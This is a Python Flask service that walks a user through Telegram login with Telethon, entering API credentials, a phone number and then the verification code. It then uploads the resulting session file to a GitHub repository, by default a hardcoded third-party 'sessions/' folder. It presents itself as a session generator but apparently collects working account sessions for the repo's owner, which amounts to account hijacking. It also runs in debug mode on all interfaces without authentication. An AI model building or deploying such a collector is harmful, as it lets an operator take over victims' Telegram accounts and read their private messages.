from flask import Flask, request, jsonify
from telethon import TelegramClient
import os
import threading
import base64
import requests
import asyncio

app = Flask(__name__)

# Secure GitHub Configuration via Environment Variables
GITHUB_USERNAME = os.getenv("GITHUB_USERNAME", "Phi-star")
GITHUB_REPO = os.getenv("GITHUB_REPO", "Big-daddy-R2-season")
GITHUB_PAT = os.getenv("GITHUB_PAT")  # Secure GitHub Token
GITHUB_FOLDER = "sessions/"  # Folder for storing session files

# GitHub API Base URL
GITHUB_API_BASE = f"https://api.github.com/repos/{GITHUB_USERNAME}/{GITHUB_REPO}/contents/{GITHUB_FOLDER}"

PORT = int(os.getenv("PORT", 5000))  # Use Render's assigned PORT

def send_code_thread(api_id, api_hash, phone):
    """Runs send_code in a separate thread to avoid async issues."""
    asyncio.run(send_code(api_id, api_hash, phone))

async def send_code(api_id, api_hash, phone):
    """Creates a Telegram client and sends a verification code."""
    session_name = f"session_{phone}.session"
    async with TelegramClient(session_name, api_id, api_hash) as client:
        await client.connect()
        if not await client.is_user_authorized():
            await client.send_code_request(phone)

@app.route("/generate-session", methods=["POST"])
def generate_session():
    """Receives API credentials and sends a verification code."""
    data = request.json
    api_id = data.get("api_id")
    api_hash = data.get("api_hash")
    phone = data.get("phone")

    if not api_id or not api_hash or not phone:
        return jsonify({"success": False, "message": "Missing API credentials"}), 400

    try:
        threading.Thread(target=send_code_thread, args=(api_id, api_hash, phone)).start()
        return jsonify({"success": True, "redirect": "/verify-code"})
    except Exception as e:
        return jsonify({"success": False, "message": str(e)}), 500

def complete_login_thread(api_id, api_hash, phone, code):
    """Runs complete_login in a separate thread to avoid async issues."""
    asyncio.run(complete_login(api_id, api_hash, phone, code))

async def complete_login(api_id, api_hash, phone, code):
    """Completes login and saves session file."""
    session_name = f"session_{phone}.session"
    
    async with TelegramClient(session_name, api_id, api_hash) as client:
        await client.connect()
        await client.sign_in(phone=phone, code=code)
    
    # Upload session file to GitHub
    await upload_session_to_github(session_name)

@app.route("/verify-code", methods=["POST"])
def verify_code():
    """Verifies Telegram login code and saves session."""
    data = request.json
    api_id = data.get("api_id")
    api_hash = data.get("api_hash")
    phone = data.get("phone")
    code = data.get("code")

    session_name = f"session_{phone}.session"

    try:
        threading.Thread(target=complete_login_thread, args=(api_id, api_hash, phone, code)).start()
        return jsonify({"success": True, "message": "Session created successfully!"})
    except Exception as e:
        return jsonify({"success": False, "message": str(e)}), 500

async def upload_session_to_github(session_file):
    """Uploads a session file to GitHub."""
    try:
        if not GITHUB_PAT:
            print("GitHub PAT not found. Skipping upload.")
            return
        
        with open(session_file, "rb") as f:
            content = f.read()
        encoded_content = base64.b64encode(content).decode("utf-8")

        file_name = os.path.basename(session_file)
        github_file_url = f"{GITHUB_API_BASE}/{file_name}"

        headers = {"Authorization": f"token {GITHUB_PAT}"}
        response = requests.get(github_file_url, headers=headers)
        sha = response.json().get("sha") if response.status_code == 200 else None

        payload = {
            "message": f"Adding session file: {file_name}",
            "content": encoded_content,
            "branch": "main"
        }
        if sha:
            payload["sha"] = sha  # Required for updating existing file

        response = requests.put(github_file_url, json=payload, headers=headers)

        if response.status_code in [200, 201]:
            print(f"Successfully uploaded {file_name} to GitHub.")
        else:
            print(f"GitHub upload failed: {response.json()}")

    except Exception as e:
        print(f"Error uploading session file: {e}")

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=PORT, debug=True)
